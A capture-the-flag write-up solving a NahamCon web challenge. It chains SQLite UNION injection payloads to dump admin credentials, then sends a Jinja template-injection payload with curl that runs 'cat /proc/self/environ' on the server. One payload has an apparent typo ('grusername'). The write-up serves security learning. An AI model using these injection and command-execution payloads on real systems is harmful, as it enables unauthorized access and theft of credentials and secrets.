## Agent Tester

DESCRIPTION: **We've recently hired an entry-level web developer to build an internal system to test User Agents, let us know if you find any errors!**

SOLUTION: We have the files for the application available with us. Register for a new account and we can see a field which is asking us to enter a User-Agent, although it can be a simple string too. When you enter `'` and Submit we get an error in the SQLITE query and we can see the query in the error, so we have SQLITE injection.

We can get the tables with, `a' UNION SELECT group_concat(tbl_name),group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%`

Tables: uAgents,user

Now can get the column name in the table with, `a' UNION SELECT sql, sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='user`

Columns: id, username, password, email, about

We can get username and password now, `a' UNION SELECT grusername, password FROM user WHERE 'a'='a`
(The response for this query might be a little slow)

We have the creds `admin:*)(@skdnaj238374834**__**=`

Logging in will give us the admin account which we can use to access the `/debug` which is only accessible to admin. With this we can try for SSTI in the debug.WE can only make `POST` reqesut to `/debug`, so we can use curl to make the requests.

Checking for SSTI, `curl -X POST http://challenge.nahamcon.com:{POST NUMBER}/debug -H "Cookie: auth=eyJpZCI6MX0.YE9skg._Dzvq6t8hZGpFWbX0UEqJZ6w9eg" -d code={{config}}`
we get the data back.

Now lets get the flag, `curl -X POST http://challenge.nahamcon.com:32177/debug -H "Cookie: auth=eyJpZCI6MX0.YE9skg._Dzvq6t8hZGpFWbX0UEqJZ6w9eg" -d code="{{config.__class__.__init__.__globals__['os'].popen('cat /proc/self/environ').read()}}" --output flag.txt`

Read the flag.txt to get the flag

FLAG: **flag{fb4a87cfa85cf8c5ab2effedb4ea7006}**
